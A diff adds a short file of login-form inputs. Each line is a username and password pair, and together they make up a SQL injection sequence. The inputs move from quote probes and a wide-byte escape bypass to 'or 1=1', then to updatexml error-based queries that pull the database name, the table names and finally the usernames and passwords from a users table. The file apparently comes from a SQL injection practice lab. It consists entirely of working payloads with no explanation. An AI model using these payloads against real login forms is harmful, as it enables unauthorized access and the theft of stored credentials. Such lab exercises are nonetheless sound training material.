@@ -1,0 +1,8 @@
+User Name:adminPassword:1'
+User Name:adminPassword:1%df'
+User Name:adminPassword:1�' or 1=1#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,(select database()),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(username,3a,password) from security.users),0),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from security.users),0),0x7e),1)#
+User Name:adminPassword:1�' or updatexml(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from security.users),2),0x7e),1)#
